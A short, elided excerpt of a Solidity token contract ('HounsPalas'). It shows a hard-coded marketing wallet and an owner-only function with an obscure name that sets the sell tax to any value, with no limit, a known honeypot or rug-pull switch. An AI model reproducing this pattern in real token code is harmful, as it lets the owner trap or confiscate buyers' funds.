...
contract Houalas is Context, IERC20 {
    ...
    string private _name = "HounsPalas";
    string private _symbol = "Houalas";
    ...
    constructor ()  {
        ...
        Wallet_Marketing = payable(0x51810d872D6833A03fF5D8b264d43f311519dd81);
    ...
    function setDEHoualas(uint256 fv) external onlyOwner {
        _Tax_On_Sell = fv;
    }
